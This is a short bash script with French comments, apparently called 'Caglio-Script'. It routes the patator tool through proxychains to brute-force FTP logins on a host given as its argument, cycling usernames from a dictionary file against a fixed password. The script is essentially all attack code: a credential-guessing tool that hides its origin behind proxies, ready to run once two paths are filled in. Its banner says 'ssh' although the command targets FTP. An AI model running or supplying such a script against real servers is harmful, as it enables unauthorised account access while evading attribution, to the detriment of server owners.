#!/bin/bash
# -*- coding: utf8 

chemin_vers_patator="*à renseigné *"
chemin_vers_dico="*à renseigné *"

if [ $# = 0 ]                                       
then
    echo "..Aucune cible spécifié. ."
elif [ $1 = -h ]
then
    echo " Utilisation du patator chainé avec un proxy "
    exit
else
    echo "******* Caglio-Script ********"
    echo " patator ssh/ proxychains     "

proxychains python $chemin_vers_patator ftp_login host=$1 user=FILE0 0=$chemin_vers_dico password=asdf -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500

fi
